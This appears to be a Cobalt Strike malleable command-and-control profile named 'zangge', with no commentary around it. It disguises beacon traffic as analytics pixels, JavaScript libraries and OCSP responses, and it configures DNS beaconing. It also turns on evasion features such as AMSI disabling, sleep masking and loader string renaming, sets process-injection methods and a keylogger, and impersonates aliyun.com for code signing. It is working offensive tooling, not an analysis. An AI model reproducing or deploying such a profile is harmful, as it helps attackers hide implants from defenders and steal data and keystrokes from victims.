set sample_name "zangge";
set sleeptime "3000";
set jitter    "20";
set ssh_banner "OpenSSH_7.3 Debian (protocol 2.0)";

set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.4.4";
    set dns_max_txt          "240";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}
https-certificate {
    set keystore "cobaltstrikes.store";
    set password "zxy1402720815";
}
code-signer{
    set keystore "cobaltstrikes.store";
    set password "zxy1402720815";
    set alias "aliyun.com";
}
http-get {
    set uri "/ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /updates.rss /fwlink /cm /cx /pixel /match /visit.js /load /push /ptj /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml";

    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-us";
        header "Accept-Encoding" "text/plain";
        header "Content-Type" "application/x-www-form-urltrytryd";
        metadata {
            base64;
            prepend "SESSIONID=wqe454wqe2ds15ds4dsa5ds4";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Server" "Nodejs";
        output {
            base64;
            print;
        }
    }
}

http-config {
    set trust_x_forwarded_for "true";    
}


http-stager {  
    set uri_x86 "/vue.min.js";
    set uri_x64 "/bootstrap-2.min.js";
}
stage{
        set checksum "0";
        set compile_time "25 Oct 2022 01:57:23";
        set stomppe "true";
        set cleanup "true";
        set userwx "false";
        set sleep_mask "true";
        transform-x86 {
            strrep "ReflectiveLoader" "misakaloader";
    }
        transform-x64 {
            strrep "ReflectiveLoader" "misakaloader";
    }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "Winsock2\\CatalogChangeListener-###-0,";
    set keylogger "GetAsyncKeyState";
}
process-inject {
    set allocator "NtMapViewOfSection";

    set min_alloc "16500";
    
    set startrwx "false";
    set userwx   "false";

    transform-x86 {
        prepend "\x80\x80";
    }

    transform-x64 {
        prepend "\x80\x80";
    }
    
     execute {

        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;

        NtQueueApcThread-s;
        
        CreateRemoteThread;
        
        RtlCreateUserThread; 
    }
}
http-post {
    set uri "/submit.php /Login.php /index.php /Auth.php /ServerAuth.php";
    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-us";
        header "Accept-Encoding" "text/plain";
        header "Content-Type" "application/x-www-form-urltrytryd";
        id {
            base64;
            prepend "JSESSION=dsf5sd4f5e45fe4s65d4f856e4";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            print;
        }
    }
}
